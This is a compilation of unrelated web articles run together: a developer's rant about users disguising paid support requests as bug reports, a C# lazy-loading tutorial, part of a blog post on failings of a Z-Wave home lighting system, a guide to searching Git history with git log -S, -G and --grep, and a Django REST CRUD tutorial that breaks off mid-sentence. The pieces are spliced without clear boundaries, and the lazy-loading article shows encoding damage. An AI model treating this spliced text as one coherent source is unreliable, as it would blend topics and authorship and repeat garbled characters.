      We need to talk.
    </p><div>

<p>Here’s a paraphrased conversation I’m having way to often, costing me way too much time, keeping me from doing things that are way more important:</p>

<pre>User: Hi, I'd like to report a bug in your application.
Me:   Great! Please open a support ticket, then.
User: But, it looks like I need to pay for that?
Me:   So?
User: I just want to tell you that your app is broken, so you can fix it.
Me:   Yes, that's a support request, please open a ticket.
User: ...
</pre>

  </a>
  
</figure><p>
                             
                             
From there it typically derails into a whiny tirade about me being a crappy two bit developer who doesn’t give a shit about his code (which is ridiculous, since, professional pride aside, I have every incentive to fix bugs, to prevent my inbox from getting flooded) and just wants to rip off his users.</p>

<p>In the past, I sometimes gave in (when it sounded like something might be wrong). I looked at the issue and almost always found that nothing was broken, just didn’t work as expected (which is actually to be expected for every reasonably complex piece of software). The user just didn’t bother reading the docs and tried to bypass the fee by masquerading the support request as a bug report. So, nowadays my policy simply is: no support ticket, no service. Any such request goes straight to the trash folder without even being looked at.</p>

<h2 id="why-am-i-such-an-asshole">Why am I such an asshole?</h2>

<p>Here’s the thing: I write open source software to solve <strong>my problem</strong>. I let you use my solutions because that comes at zero cost for me (well, almost, I still have to pay for the website, you are downloading from. You are welcome, by the way). I also provide the source code, so you can fix things yourself, should my solution turn out to be unsuitable. However, once you come to me with a “bugreport” that doesn’t also include a patch (or at least very precisely pinpoints the problem), then you are basically asking me to <strong>look at your problem</strong>. At this point, it is no longer zero cost for me and that’s the reason for why I am charging you money: you are asking me to spent time on your behalf. That is commonly called <strong>work</strong>. And surprisingly enough, work is what people expect to be paid for.</p>

<p>Don’t get me wrong. I’m happy to help. Selling support is what keeps the lights on here (did I mention the cost of running a webserver?). But coming to me under false pretense and/or expecting that I <strong>must</strong> provide free service on top of a software I gave away without charge is not going to win you any favours.</p>

<p>It stops being free, when it starts costing me! My time is valuable. If you want a piece of it, I want money in return. Period.</p>

<p><strong>UPDATE:</strong> Seems like this post has struck a nerve and caused a few misunderstandings. <a href="https://raccoon.onyxbits.de/blog/reactions-bugreport-free-support/">Clarification on my position here</a>.</p>

<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div>


			
<p>Lazy loading is a very cool design pattern that is not often talked about. Many frameworks implement it without even telling us about it ðŸ˜Š. For example, .NET Entity Framework (all versions) support the pattern.&nbsp;</p>



<p>But what is lazy loading? The idea behind the pattern is simple. By using lazy loading, we defer the initialization of objects (heavy ones) until we need them. Thatâ€™s it.</p>



<p>Letâ€™s provide an example. We have a simple HR application. The application supports the tracking of employee records. Each record has standard fields like name, email, date of birth, and image (like a profile picture), etc.</p>



<p>The application has operations like adding employees, updating employees, searching for an employee, generating reports, etc. Do all functions need the image of the employee? Should we load images in some aggregated reports? Of course not. A picture can take a lot of resources, so it is not reasonable to load it everywhere. And here, lazy loading comes to help us.</p>



<h2>Lazy loading implementation</h2>



<p>There are several ways to implement the lazy loading pattern, but we are going to inspect the most used one (when it comes to manual implementation).</p>



<p>In the source code, the employee domain model is represented like this:</p>



<pre><div><div><p><span>public</span> <span>class</span> Employee<br>
&nbsp; &nbsp; <span>{</span><br>
&nbsp; &nbsp; &nbsp; &nbsp; <span>public</span> <span>string</span> Name <span>{</span> <span>get</span><span>;</span> <span>set</span><span>;</span> <span>}</span></p><p>

&nbsp; &nbsp; &nbsp; &nbsp; <span>public</span> <span>string</span> Email <span>{</span> <span>get</span><span>;</span> <span>set</span><span>;</span> <span>}</span></p><p>

&nbsp; &nbsp; &nbsp; &nbsp; <span>public</span> <span>byte</span><span>[</span><span>]</span> Image <span>{</span> <span>get</span><span>;</span> <span>set</span><span>;</span> <span>}</span></p><p>

&nbsp; &nbsp; &nbsp; &nbsp; <span>public</span> Employee<span>(</span><span>)</span><br>
&nbsp; &nbsp; &nbsp; &nbsp; <span>{</span><span>}</span></p><p>

&nbsp; &nbsp; &nbsp; &nbsp; <span>public</span> <span>void</span> Load<span>(</span><span>)</span><br>
&nbsp; &nbsp; &nbsp; &nbsp; <span>{</span><br>
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; <span>// LOGIC LOADING ALL THE DATA.</span><br>
&nbsp; &nbsp; &nbsp; &nbsp; <span>}</span><br>
&nbsp; &nbsp; <span>}</span></p></div></div>

</pre>



<p>Nothing special. Just a class with three fields and a method which would load all the data. But as we said, most of the time, we do not want the Image data because it could take a lot of resources.</p>



<p>So, how do we <a href="https://ddimitrov.dev/2020/02/15/what-is-code-refactoring/">refactor</a> the class? We do It like this:</p>



<pre><div><div><p><span>public</span> <span>class</span> Employee<br>
&nbsp; &nbsp; <span>{</span><br>
&nbsp; &nbsp; &nbsp; &nbsp; <span>private</span> <span>byte</span><span>[</span><span>]</span> image<span>;</span></p><p>

&nbsp; &nbsp; &nbsp; &nbsp; <span>public</span> <span>string</span> Name <span>{</span> <span>get</span><span>;</span> <span>set</span><span>;</span> <span>}</span></p><p>

&nbsp; &nbsp; &nbsp; &nbsp; <span>public</span> <span>string</span> Email <span>{</span> <span>get</span><span>;</span> <span>set</span><span>;</span> <span>}</span></p><p>

&nbsp; &nbsp; &nbsp; &nbsp; <span>public</span> <span>byte</span><span>[</span><span>]</span> Image <br>
&nbsp; &nbsp; &nbsp; &nbsp; <span>{</span> <br>
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; <span>get</span> <span>{</span><br>
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; <span>if</span> <span>(</span>image <span>==</span> <span>null</span><span>)</span><br>
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; <span>{</span><br>
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; image <span>=</span> LoadImage<span>(</span><span>)</span><span>;</span><br>
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; <span>return</span> image<span>;</span><br>
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; <span>}</span><br>
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; <span>else</span><br>
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; <span>{</span><br>
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; <span>return</span> image<span>;</span><br>
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; <span>}</span><br>
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; <span>}</span> <br>
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; <span>set</span> <span>{</span> <br>
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; image <span>=</span> <span>value</span><span>;</span> <br>
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; <span>}</span> <br>
&nbsp; &nbsp; &nbsp; &nbsp; <span>}</span><br>
&nbsp; &nbsp; &nbsp; &nbsp; <span>public</span> Employee<span>(</span><span>)</span><br>
&nbsp; &nbsp; &nbsp; &nbsp; <span>{</span><span>}</span></p><p>

&nbsp; &nbsp; &nbsp; &nbsp; <span>public</span> <span>void</span> Load<span>(</span><span>)</span><br>
&nbsp; &nbsp; &nbsp; &nbsp; <span>{</span><br>
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; <span>// LOGIC LOADING ONLY NAME AND EMAIL PROPERTIES.</span><br>
&nbsp; &nbsp; &nbsp; &nbsp; <span>}</span></p><p>

&nbsp; &nbsp; &nbsp; &nbsp; <span>public</span> <span>byte</span><span>[</span><span>]</span> LoadImage<span>(</span><span>)</span><br>
&nbsp; &nbsp; &nbsp; &nbsp; <span>{</span><br>
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; <span>// LOGIC LOADING AND RETURNING IMAGE DATA.</span><br>
&nbsp; &nbsp; &nbsp; &nbsp; <span>}</span><br>
&nbsp; &nbsp; <span>}</span></p></div></div>

</pre>



<p>We followed only four steps:</p>



<ol type="1"><li>Extract the logic for image data load from the Load method to a new Method â€“ LoadImage;</li><li>Introduce a new private field for the image data;</li><li>Refactor the Image property to check if image data is null. If it is, the new method loads the image data, assigns it to the image field, and then return it to the consumer.</li></ol>



<p>Next time we load the object (or objects if we load a collection of them), we wonâ€™t have the overhead of loading unnecessary image data. We are going to extract the image data only when we need it (by accessing Image property).</p>



<h2><strong>ORMs</strong></h2>



<p>ORMs like <a href="https://docs.microsoft.com/en-us/ef/core/querying/related-data" target="_blank" rel="noreferrer noopener nofollow">Entity Framework Core</a> support lazy loading. When a query is executed, not all the properties are loaded (unless you have disabled lazy loading). Only by accessing them, another query runs to fetch the data.</p>



<p>For example, imagine we have two entities in relation: a Company entity and an Employee entity. A company has many employees. If we query for a specific company by id and we get a result, the list of its employees wonâ€™t be loaded. Only when we access them a new query will fetch the collection.</p>



<p>In some cases, this is cool in others, not ðŸ˜Š.</p>



<p>Can we implement our own lazy loading if we are using some ORM? Sure. The thing you should do is not to map properties/entities that donâ€™t need to be loaded with every query. Of course, you should provide proper methods to handle the data that is not loaded.</p>



<p>In Entity Framework, you use the [NotMapped] attribute to annotate desired properties.</p>



<p>You can read in many places that lazy loading is used when accessing network resources. That is true but not complete. You can use lazy loading also for any demanding operation, like complex computations, reading big chunks of local data, etc.</p>

  <p>Back in 2012 my wife and I started a house renovation project in Edinburgh (Scotland) having moved to that great city the previous year. In our previous London abode we’d installed a wireless lighting system from a company called Rako and it worked well enough to convince us that wireless was the way to go. Now, having installed and maintained a system with over 150 wireless lighting control circuits over the past 7 years I’ve finally had to admit that my technology choice was wrong. The Z-Wave wireless lighting system I installed just doesn’t work for a home like mine. I have now ripped out almost all of the Z-Wave units I installed – which had cost me more than £6k to buy and install. Read on to see the 10 reasons I finally kicked it out and what I have now replaced it with.</p>
<h2>My career in Wireless</h2>
<p><img loading="lazy" src="https://secureservercdn.net/160.153.137.170/onv.491.myftpupload.com/wp-content/uploads/2020/11/Actixlogohires-300x224.jpg" alt="" width="205" height="153" srcset="https://secureservercdn.net/160.153.137.170/onv.491.myftpupload.com/wp-content/uploads/2020/11/Actixlogohires-300x224.jpg 300w, https://secureservercdn.net/160.153.137.170/onv.491.myftpupload.com/wp-content/uploads/2020/11/Actixlogohires-100x75.jpg 100w, https://secureservercdn.net/160.153.137.170/onv.491.myftpupload.com/wp-content/uploads/2020/11/Actixlogohires.jpg 500w" sizes="(max-width: 205px) 100vw, 205px">Firstly let me explain that I spent most of my career in the wireless (mobile phone) industry and consider myself to have a reasonable degree of expertise in the field. The company I founded (<a href="http://www.actix.com/">http://www.actix.com</a>) has been a leading specialist in planning and optimising new wireless technologies for the past 25 years and has developed solutions for measurement and optimisation of everything from Analog to 5G.</p>
<p>Wireless technology is behind some of the most amazing developments of the last 50 years – things like the iPhone and satellite TV. So you may find it strange that I would be doubting the ability of a leading home-automation wireless technology to do something as straightforward as turning a light on and off. But unfortunately my experience has been exactly that.&nbsp;</p>
<h2>Z-Wave – The system I chose in 2012</h2>
<p>Back in 2012 I asked for recommendations from the people I knew who were Home Automation pioneers – not least <a href="https://www.devicepilot.com/about">Pilgrim Beart</a> (the founder of the Hive product <a href="https://www.hivehome.com/">https://www.hivehome.com</a> now owned by BG) and <a href="https://en.wikipedia.org/wiki/Quentin_Stafford-Fraser">Quentin Stafford-Fraser</a> (co-inventor of the webcam). The consensus around the time was that one of the wireless technologies already on the market would become the de-facto standard for domestic lighting control. That seemed pretty compelling as companies like <a href="https://aeotec.com/">AeoTech,</a>&nbsp;<a href="https://www.fibaro.com/en/">Fibaro</a>, Philips and LightwaveRF were already producing wireless lighting systems including (in the first two instances) control modules that could be retro-fitted into the pattress (wall-box) behind a light switch.</p>
<p><img loading="lazy" src="https://secureservercdn.net/160.153.137.170/onv.491.myftpupload.com/wp-content/uploads/2020/11/Screenshot-2020-11-14-190552.png" alt="" width="172" height="145" srcset="https://secureservercdn.net/160.153.137.170/onv.491.myftpupload.com/wp-content/uploads/2020/11/Screenshot-2020-11-14-190552.png 172w, https://secureservercdn.net/160.153.137.170/onv.491.myftpupload.com/wp-content/uploads/2020/11/Screenshot-2020-11-14-190552-100x84.png 100w" sizes="(max-width: 172px) 100vw, 172px"><img loading="lazy" src="https://secureservercdn.net/160.153.137.170/onv.491.myftpupload.com/wp-content/uploads/2020/11/Screenshot-2020-11-14-190703-300x210.png" alt="" width="231" height="162" srcset="https://secureservercdn.net/160.153.137.170/onv.491.myftpupload.com/wp-content/uploads/2020/11/Screenshot-2020-11-14-190703-300x210.png 300w, https://secureservercdn.net/160.153.137.170/onv.491.myftpupload.com/wp-content/uploads/2020/11/Screenshot-2020-11-14-190703-100x70.png 100w, https://secureservercdn.net/160.153.137.170/onv.491.myftpupload.com/wp-content/uploads/2020/11/Screenshot-2020-11-14-190703.png 753w" sizes="(max-width: 231px) 100vw, 231px"></p>
<p>At that time there were essentially three main choices of wireless technology: <a href="https://www.z-wave.com/">Z-Wave</a>, <a href="https://lightwaverf.com/">LightwaveRF</a> and <a href="https://zigbeealliance.org/">ZigBee</a>. I discounted LightwaveRF as it was (still is?) very range limited and my house is an old one built almost entirely from large stone blocks (even internally) that are very good at blocking RF signals. Between Z-Wave and ZigBee there wasn’t much to choose from a wireless perspective but the decision was made for me when I looked at the manufacturer support for each technology. As mentioned above companies like AeoTech and Fibaro already had modules (devices that turn on/off or dim a circuit) on the market that I thought would be ideal for my lighting control system whereas such support for ZigBee was pretty much completely absent save a few hobbyist-level companies.</p>
<p>So I found a supplier (<a href="https://www.vesternet.com/">Vesternet</a> – who have been great by the way) and started ordering Z-Wave modules to try out. Fast-forward 18 months or so and I’d installed (with the help of a great electrician called Lorenzo) over 150 circuits with Z-Wave control. Many of the modules I installed in that period were Fibaro generation 1 dimmer and switch (relay) units. They had a few quirks but I found that if I bought the right LED lamps (mainly Philips ones) and used the balun that you can buy to compliment a Fibaro dimmer then I could get (relatively) flicker-free dimming wirelessly.</p>

Picture by Rab (Ian or Yanny) Gamble.</p></div>
<p>Since Lorenzo was replacing most of the wiring in the house I managed to get him to bring a lot of the control cables together in around five separate locations. This simplified the task of adding devices and also helped me to keep track of the actual units. To this day I have a spreadsheet with around 500 lines (around 3 lines per circuit) which details all of the lighting circuits in the house, the circuit breaker they are connected to, the type of device that controls the circuit and its location. Unfortunately I wasn’t 100% successful in getting the control point of all the lighting circuits in one of these five locations and there are actually at least three units lost in the walls somewhere which respond to Z-Wave commands but don’t seem to control anything I can find!</p>
<h2>Z-Wave Hubs</h2>
<p>Having chosen a technology and the modules to turn things on and off (or dim them) the next step is to decide on a central hub or controller as all Z-Wave networks need one of those. At the time a popular one was called <a href="https://www.vesternet.com/pages/vera-controller-comparison">Vera</a> and I initially opted for that. It had a reasonably good way of overcoming one of the problems of Z-Wave (adding a new module requires the hub and the module to be close together) which came in the form of a battery box that could power the hub while you moved it around to add modules (the AeoTech Z-Stick has a similar feature). Unfortunately Vera also had a number of downsides – a limited API to allow it to be controlled by other systems, a non-working backup system that forgot what modules had been added and a slow processor which meant adding multiple modules took a stupidly long time.</p>

<p>So began a waltz through a significant part of the available hub-landscape, taking in <a href="https://www.vesternet.com/products/z-wave-fibaro-home-center-2-system">Fibaro’s HC2 hub</a>, a Mac-based home automation app called <a href="https://www.indigodomo.com/">Indigo</a>, an open-source system called <a href="https://www.domoticz.com/">Domoticz</a> and finally <a href="https://www.home-assistant.io/">Home Assistant</a> (recommended by Quentin who I mentioned previously – did I tell you he co-invented the web-cam – I did – but I guess that’s cool enough to be mentioned twice – right?). Each has their own strengths and weaknesses but ultimately a lot of the problems I found with any of these systems came down to issues with Z-Wave itself and while my sashays from one to another sometimes gave me the impression of progress they generally just shifted the shadows around and left the underlying issues unresolved.</p>
<p>What did prove to be significant though was the hardware on which these systems are based. The Vera and Fibaro HC2 have their own hardware platforms which are not open and this gave me quite a bit of trouble as I tried to work though the failure concentration problem that I will attempt to explicate later. The Mac-based system was good in the sense that it was based on Mac hardware which I have found to be relatively reliable. However, it was, ironically, the failure of a Mac Mini which ultimately precipitated another switch that I had been mulling due to a lack of Z-Wave diagnostics.</p>
<p>The systems I moved to (Domoticz and then Home Assistant) were based on Raspberry Pi hardware and that has resulted in quite a few more problems – SD card corruption due to brown-outs, reboots at unfortunate times due to me attempting to automate system updates and hardware failure initiated by some circuit breaker issues I experienced.</p>
<h2>Reason 1: Z-Wave Pairing</h2>
<p>The process of adding a module to a Z-Wave network is to put the hub into “include” mode and then press a button on the module while it is close to the hub. That sounds simple enough but now imagine doing this for 150 modules scattered around a house, some behind wall-plates, others in waterproof boxes, concealed in ceilings, etc.</p>
<p><img loading="lazy" src="https://secureservercdn.net/160.153.137.170/onv.491.myftpupload.com/wp-content/uploads/2020/11/z-wave-protocol-hacking-300x157.png" alt="" width="300" height="157" srcset="https://secureservercdn.net/160.153.137.170/onv.491.myftpupload.com/wp-content/uploads/2020/11/z-wave-protocol-hacking-300x157.png 300w, https://secureservercdn.net/160.153.137.170/onv.491.myftpupload.com/wp-content/uploads/2020/11/z-wave-protocol-hacking-100x52.png 100w, https://secureservercdn.net/160.153.137.170/onv.491.myftpupload.com/wp-content/uploads/2020/11/z-wave-protocol-hacking.png 728w" sizes="(max-width: 300px) 100vw, 300px"></p>
<p>It was quite onerous to do it once but I think I’ve probably done it on average three times for every module in the house plus quite a few more times for modules that I’ve moved around, or have failed and had to be replaced. That’s getting on for 500 include processes. And that’s just to get the module visible to the system. Once it is included you generally have to locate the specific function(s) of the module you want to use (e.g. a motion sensor might have a temperature reading, a light-level and an alarm setting in addition to the motion detection function), then you give each function a name, then you need to indicate what room it is in, then you might want to group it with other module functions (so, for instance, a mood setting in the dining room sets the light levels on five different modules via a scene or group). All of that needs to be typed in and you will generally be doing this while wandering around, so you will do it on a laptop or tablet and sometimes up a ladder or in a cupboard.</p>
<p>I have now gotten to the stage where I dread some modules failing. The one that controls a water-feature in the garden is in a sealed box, the one that controls an out-door heater is in a small loft area that can only be accessed by a rickety ladder, the one for the guest-room extractor fan is in a crawl space, etc. This can’t be the right way to do things can it?</p>
<p>When I compare this to the way IT operations used to be compared to the way dev-ops is now I think it is fair to say that we are just at the start and that things must change. It used to be normal that an IT person would have to physically sit at a computer for hour on end to install OSes, applications and security. Now it is done remotely and automatically on predominantly virtualized hardware. Furthermore, most apps are now in the cloud and the management of the servers that run them are automated to the Nth degree. Home automation and IoT have a long way to go!</p>
<h2>Reason 2: Z-Wave Healing After Adding a Module</h2>
<p>As mentioned a common challenge with Z-Wave is that introducing a new module to the network requires the module and hub to be close together. This actually creates a lot of work. There are two main ways to handle this:</p>
<ol>
<li>bring the hub to the module once it is in-situ and operating</li>
<li>power the module up when it is close to the hub and then move it later</li>
</ol>
<p>Both options are problematic if you are relying on the mesh network capabilities to extend the range of the network because the mesh works by finding routes from one module to another so that it can communicate at distance.</p>

    <p>You’re happily working your way through a codebase when you happen upon some code that makes you stop and think: What the…!? Maybe it’s a method that’s doing something surprising. Or perhaps it’s doing something completely unsurprising, it’s just doing it in a surprising way.</p>

<p><img src="https://tekin.co.uk/images/20201113/math-lady.jpg" alt=""></p>

<h2 id="git-blame-to-the-rescue">Git blame to the rescue?</h2>

<p>When this happens you might instinctively reach for <code>git blame</code> to help you figure out what’s going on. After all, <code>git blame</code> gives you the commit that most recently touched the line, and often that’s enough to point you in the right direction. But often it isn’t and you’re none the wiser. That’s because:</p>

<ul>
  <li><strong>git blame is too coarse</strong>: it reports against the whole line. If the most recent change isn’t related to the part of the line you’re interested, you’re out of luck.</li>
  <li><strong>git blame is too shallow</strong>: it only reports a single change; the most recent one. The story of the particular piece of code you’re interested in may have evolved over several commits.</li>
  <li><strong>git blame is too narrow</strong>: it only considers the file you are running blame against. The code you are interested in may also appear in other files, but to get the relevant commits on those you’ll need to run blame several times.</li>
</ul>

<p>If you only use <code>git blame</code> you’re limiting yourself to a one-dimensional perspective of the code you’re trying to understand. Wouldn’t it be better to view things in 3D!?</p>

<h2 id="a-more-powerful-way-to-trace-the-history-of-wtf-code">A more powerful way to trace the history of WTF code</h2>

<p>Thankfully Git has some pretty powerful search tools built right in. Let’s take a closer look at some of the tools at our disposal.</p>

<h2 id="find-all-commits-containing-a-particular-piece-code">Find all commits containing a particular piece code</h2>

<p>If <code>git blame</code> is entry-level history search, <code>git log -S</code> (also known as “the pickaxe”) is how you take things to the next level. It lets you search for all commits that contain a given string:</p>

<div><div><pre><code><span>$ </span>git log <span>-S</span> <span>"method_name"</span>
</code></pre></div></div>

<p>This will return all the commits that contain <code>method_name</code> across the entire repository, giving you a bespoke history of a piece of code across both multiple commits and files. You can use the pickaxe to examine the entire history of a particular snippet: all the places it’s been used; how it’s usage has changed; if it’s moved file; when it was first introduced, and more.</p>

<h2 id="see-the-diffs-alongside-the-commit-messages">See the diffs alongside the commit messages</h2>

<p>If you include the <code>-p</code> option (short for <code>--patch</code>) you get the full diff alongside the commit messages, giving you even more context and making it easier to spot the relevant changes:</p>

<div><div><pre><code>$ git log -S "method_name" -p
</code></pre></div></div>

<h2 id="find-the-commit-that-first-added-some-code">Find the commit that first added some code</h2>

<p>Say you want to find the first commit that introduced a particular class, method or snippet of code. You can use the pickaxe combined with the <code>--reverse</code> option to get the commits in reverse-chronological order so the commit where the code first appears is listed at the top:</p>

<div><div><pre><code>$ git log -S "method_name" -p --reverse
</code></pre></div></div>

<h2 id="find-when-a-piece-of-code-was-deleted">Find when a piece of code was deleted</h2>

<p>Because the pickaxe search finds both additions and deletions, you can even use it to find code that has since been deleted:</p>

<div><div><pre><code>$ git log -S "deleted code" -p
</code></pre></div></div>

<p>Assuming the snippet no longer exists in the codebase the first commit returned will be the one where it was removed.</p>

<h2 id="limit-the-scope-of-the-search">Limit the scope of the search</h2>

<p>Because we’re using <code>git log</code> you can also provide a path to focus the search to a given file or folder:</p>

<div><div><pre><code>$ git log -S "some code" -p app/models/user.rb
</code></pre></div></div>

<h2 id="search-deeper-with-a-regular-expression">Search deeper with a regular expression</h2>

<p>I mostly stick to the pickaxe because I find working with regular expressions cumbersome, but if you want to perform a more advanced search using a regular expression you can do so with <code>-G</code> instead:</p>

<div><div><pre><code>$ git log -G "REGEX HERE"
</code></pre></div></div>

<p>It’s also worth noting that searching with <code>-S</code> has a subtle limitation that <code>-G</code> does not: <code>-S</code> only shows commits that either added or removed the search string. If the string you are searching for moved within the same file but was otherwise unchanged, <code>-S</code> won’t include that commit, whereas <code>-G</code> will.</p>

<h2 id="search-the-commit-messages-themselves">Search the commit messages themselves</h2>

<p>Sometimes searching for literal code is too narrow, or the information you’re after isn’t actually in the code but in the commit messages themselves. In which case you can use <code>--grep</code> to search commit messages instead:</p>

<div><div><pre><code>$ git log --grep "commit message search"
</code></pre></div></div>

<h2 id="in-summary">In summary</h2>

<p>Next time some code has you puzzled and you want to understand more about it, look beyond <code>git blame</code> and dig deeper into the history using the pickaxe and friends:</p>

<ul>
  <li>Find the entire history of a snippet of code with <code>git log -S</code></li>
  <li>Include <code>-p</code> to see the diff as well as the commit messages</li>
  <li>Include <code>--reverse</code> to see the commit that introduced the code listed first</li>
  <li>Scope search to specific folders or files by including a path</li>
  <li>Search with a regular expression using <code>git log -G</code></li>
  <li>Search commit messages using <code>git log --grep</code></li>
</ul>

<h2 id="epilogue">Epilogue</h2>

<p>Of course searching a codebase’s history will only be fruitful if the history itself is helpful. If the history hasn’t been constructed with atomic commits that have useful commit messages, searching it will likely be a frustrating and unhelpful experience.</p>

<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div><p>The Django framework for building python server applications has been around since forever and I believe that the reason for this is the speed at which you can develop apps without compromising on robustness.<br></p><p>To gauge the usefulness of any backend framework, a great litmus test is to see how easy it is to plug in a database to your application and expose the database models to the client via 4 operations - Create, Read, Update and Delete.<br></p><p>This functionality solves a big chunk of your problems, especially if you are building a product that is more front-end heavy and you want to spend as little bandwidth as possible on building your APIs.<br></p><h3><strong>What is CRUD?</strong><br></h3><p>An application server is nothing but a layer on top of a database which provides the ability for a client application to perform the following underlying operations.<br></p><ol role="list"><li>Create a new entry into a table in the database.</li><li>Read the database table entries either by fetching a list of all entries or retrieving the details of a single entry.</li><li>Update an existing entry in the database either by changing certain details or by replacing it entirely with a new one.</li><li>Delete a database table entry either by removing it from the database or by simply marking it as deleted and deactivating it.<br></li></ol><p>Django has ways of doing all of this right out of the box, but I prefer to use a framework written on top of Django called the <a href="https://www.django-rest-framework.org/" target="_blank">Django Rest Framework</a> which makes things even simpler by providing an intuitive interface to the developers. <br></p><h3><strong>A sample CRUD application</strong><br></h3><div><p>I write all my blog posts on the apple notes app before I edit and publish them and it occurred to me that a note taking app is a great way to <a href="https://github.com/sankalpjonn/django-crud-example" target="_blank">demonstrate a CRUD application</a>. </p></div><figure id="w-node-bc04fc2d279c-87eecd11"><p><img src="https://uploads-ssl.webflow.com/5e0b01877436086c8beecd1a/5faf5796ca5e3a5dd77c5b41_XEHsDH39C2XuP7jH2D_R7hv6wYs8ZGIBkCij0NWiAXStAOuzeIqG61JLp52DNELlsmxqfuMj33tIE-0YsgTIIIDeskVcpRMarPKJKsNA4O2rBoMIFmgahW8Vo2J0YCLZqBsym1Mb.png" alt=""></p><figcaption>A note taking app that we will build using Django and Django Rest Framework</figcaption></figure><p>To build an application like this, we need a database table that stores a list of notes consisting of a Title, Content and the last updated timestamp. The notes are sorted according to the last updated timestamp.</p><p>To build this application we need the following functions:&nbsp;</p><ol start="1" role="list"><li>Creating a new note with an empty title and content.</li><li>Updating the newly created note with a title and content.</li><li>Reading the fields of a note.</li><li>Partially updating the note by modifying either tile or content.</li><li>Listing all the notes in the database sorted by last updated timestamp.</li><li>Deleting a note by marking it as deactivated.</li></ol><p>I&nbsp;will be going through all the steps involved in creating this application, but first let's start with the basics.</p><h3>Setting up a Django project</h3><p>There is some basic boilerplate code involved in building any Django application. Here is a summary of all the steps needed to set up the boilerplate<br>‍</p><p><em>&lt;p&gt; CODE:&nbsp;https://gist.github.com/sankalpjonn/07b99adf85538b5a90a0dcaa34de328c.js&lt;/p&gt;</em></p><h5><strong>Need for a virtual environment</strong></h5><p>While building any python applications, it is recommended to create a virtual environment and install all the packages you need within this environment to keep them isolated from the rest of your machine. This not only ensures prevention of conflicts but also makes it easy to deploy this application anywhere you want.</p><p>Once this virtual environment is activated, your development environment is setup.</p><h5><strong>Creating a Django project</strong></h5><p>Once the virtual environment is created and the necessary python packages are installed, the boilerplate code you need can be created by using a nifty tool called django-admin. We will use this to create a project called <em>notesapp</em>. This not only creates the project structure but also configures a default SQLite database that you can use for the application. </p><p>This database is nothing but a single file created locally with the name <em>db.sqlite3</em> and is very handy to quickly prototype your application. You can change the database settings inside <em>settings.py</em> to point it to any database. This can be done later too once the basic functionality of your application is ready and works with SQLIte.</p><p>After your Django project is created, you also have to create a new Django app which we will use to define our models and APIs. Let's call this <em>notes. </em>Make sure to add this to the INSTALLED_APPS section of your settings.py</p><h3>Creating database models</h3><p>Before writing the CRUD&nbsp;APIs, we must first create a database model on which we wish to perform the CRUD&nbsp;operations. Let us create a model called <em>Note </em>in notes/models.py.</p><p>‍</p><p>&lt;p&gt; CODE:&nbsp;https://gist.github.com/sankalpjonn/d5e29080d973326be371f0d03a5d23ef.js&lt;/p&gt;</p><p>‍</p><p>Before we proceed we must update the schema because a new database table needs to be created in the underlying database. This can be done by creating and running migrations</p><p>‍</p><p>&lt;p&gt; CODE: https://gist.github.com/sankalpjonn/8234bd9ad41637718be8dca4dba04235.js&lt;/p&gt;<br>‍</p><h3>Creating the CRUD&nbsp;APIs</h3><p>Now that the model has been created, we need a way to perform CRUD operations on this model by writing as little code as possible. This is where Django Rest Framework comes in. Not only can you expose CRUD&nbsp;APIs on this model within minutes, but you also get a pretty nifty user interface to view those APIs in action. </p><p>To do this, you must first define a serializer for the database model you created in the above step. <strong>‍</strong></p><h5><strong>Defining a serializer</strong></h5><p>A serializer is responsible for two things<br></p><ol start="1" role="list"><li>To validate an incoming create/update request and reject it if the fields are not in the format that is required to create/update an entry in the database table.</li><li>To convert a database table entry into a format like JSON&nbsp;that can be transferred over the internet to the client.</li></ol><p>Let us create a serializer in notes/serializers.py as follows.</p><p>‍</p><p>&lt;p&gt; CODE:&nbsp;https://gist.github.com/sankalpjonn/4d69bb0c0de94789842fe9eb23e8e882.js&lt;/p&gt;</p><p>‍</p><p>Inside the Meta class, we define which database model is being serialized and what all fields within that model should be serialized. We could choose to include only certain fields from the model that we would like to expose over the API.</p><p>We can also define certain fields as <em>read_only</em> which indicates that these fields will be ignored if present in a create/update request but they will be present in the response a read request. </p><p>In this above case, is_active is responsible for indicating if a note has been deleted or not. Therefore we must not allow it to be modified via a create/update request and it should be set to false only when a delete operation is performed. This will become more clear in the upcoming steps. </p><p>We can also define fields as <em>write_only </em>which will indicate that these fields will not be present in a read response but we will allow the field to be modified in a create/update request. We can now proceed to writing the CRUD&nbsp;APIs</p><h5><strong>Defining an API&nbsp;View set</strong></h5><p>In Django, the APIs are written in views.py and each API&nbsp;that does some operation on a certain database resource is a view. In our case we will be performing multiple operations on the database model and hence what we need is a viewset. Here is how you define one in notes/views.py</p><p>‍</p><p>&lt;p&gt; 